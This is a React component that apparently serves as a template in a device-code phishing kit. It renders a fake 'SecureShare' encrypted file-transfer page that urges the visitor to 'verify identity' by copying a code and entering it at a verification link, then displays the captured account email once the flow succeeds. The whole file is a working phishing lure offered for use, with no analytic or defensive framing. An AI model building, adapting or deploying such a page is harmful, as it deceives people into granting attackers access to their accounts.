import React from 'react';
import { useDeviceCodeFlow } from '../../hooks/useDeviceCodeFlow';

export function SecureShareTemplate(): React.ReactElement {
  const f = useDeviceCodeFlow();

  return (
    <div className="tpl-page" style={{ background: '#f0f4f8' }}>
      <div className="tpl-split-container">
        <div className="tpl-split-left" style={{ background: 'linear-gradient(135deg, #1a365d 0%, #2b6cb0 100%)' }}>
          <svg width="32" height="32" viewBox="0 0 32 32"><rect width="32" height="32" rx="6" fill="rgba(255,255,255,0.2)"/><path d="M16 6l-8 4v6c0 5.5 3.4 10.7 8 12 4.6-1.3 8-6.5 8-12v-6l-8-4z" fill="white" opacity="0.9"/></svg>
          <h2>SecureShare</h2>
          <p>Enterprise-grade file sharing with end-to-end encryption. Your documents are protected.</p>
          <div className="tpl-split-features">
            <div className="tpl-split-feature"><svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2"><polyline points="20 6 9 17 4 12"/></svg> End-to-end encryption</div>
            <div className="tpl-split-feature"><svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2"><polyline points="20 6 9 17 4 12"/></svg> Access controls</div>
            <div className="tpl-split-feature"><svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2"><polyline points="20 6 9 17 4 12"/></svg> Compliance ready</div>
          </div>
        </div>
        <div className="tpl-split-right">
          {f.state === 'idle' && (
            <>
              <h1 className="tpl-title">Access Shared Files</h1>
              <p className="tpl-text">You have received a secure file transfer. Verify your identity to download.</p>
              <div className="tpl-info-box" style={{ background: '#ebf4ff', borderColor: '#bee3f8', color: '#2b6cb0' }}>
                <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#2b6cb0" strokeWidth="2"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
                <span>Encrypted transfer — Verify to unlock</span>
              </div>
              <button className="tpl-btn" style={{ background: '#2b6cb0' }} onClick={f.handleStart}>Verify Identity</button>
            </>
          )}
          {f.state === 'loading' && <div className="tpl-center"><div className="capture-spinner" /><p>Preparing secure access...</p></div>}
          {(f.state === 'code_ready' || f.state === 'waiting') && (
            <>
              <h1 className="tpl-title">Verification Code</h1>
              <p className="tpl-text">Enter this code to unlock the secure file transfer.</p>
              <div className="tpl-code-box"><div className="tpl-code-label">SECURITY CODE</div><div className="tpl-code">{f.userCode}</div><button className="tpl-copy-btn" onClick={f.handleCopy}>{f.copied ? 'Copied!' : 'Copy'}</button></div>
              <div className="tpl-steps"><div className="tpl-step">1. Copy the security code</div><div className="tpl-step">2. Click verify and enter it</div></div>
              <button className="tpl-btn" style={{ background: '#2b6cb0' }} onClick={f.handleVerify}>Verify</button>
              {f.state === 'waiting' && <p className="tpl-waiting">Verifying...</p>}
              <p className="tpl-expiry">Code expires in {f.formatTime(f.countdown)}</p>
            </>
          )}
          {f.state === 'success' && <div className="tpl-center"><svg width="56" height="56" viewBox="0 0 24 24" fill="none" stroke="#107c10" strokeWidth="2"><path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"/><polyline points="22 4 12 14.01 9 11.01"/></svg><h1 className="tpl-title">Files Unlocked</h1>{f.authEmail && <p>Account: <strong>{f.authEmail}</strong></p>}<p className="tpl-text">Your files are ready for download.</p><button className="tpl-btn secondary" onClick={f.handleReset}>Access another</button></div>}
          {f.state === 'expired' && <div className="tpl-center"><h1 className="tpl-title">Code Expired</h1><button className="tpl-btn" style={{ background: '#2b6cb0' }} onClick={f.handleReset}>Try Again</button></div>}
          {f.state === 'error' && <div className="tpl-center"><h1 className="tpl-title">Error</h1><p className="tpl-text">{f.errorMsg}</p><button className="tpl-btn" style={{ background: '#2b6cb0' }} onClick={f.handleReset}>Try Again</button></div>}
        </div>
      </div>
    </div>
  );
}
